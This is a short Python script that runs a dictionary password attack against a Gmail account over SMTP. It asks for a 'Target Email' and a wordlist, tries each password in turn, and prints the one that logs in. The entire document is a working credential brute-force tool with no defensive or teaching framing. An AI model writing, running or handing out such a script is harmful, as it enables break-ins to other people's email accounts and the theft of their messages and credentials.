import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input('Target Email : ')
word = input('wordlist : ')
passwords = open(word, 'r').readlines()

for password in passwords:
    try:
        smtpserver.login(user, password)
        print("\nPassword : {}".format(password))
        break
    except smtplib.SMTPAuthenticationError:
        print("fail.. {}".format(password))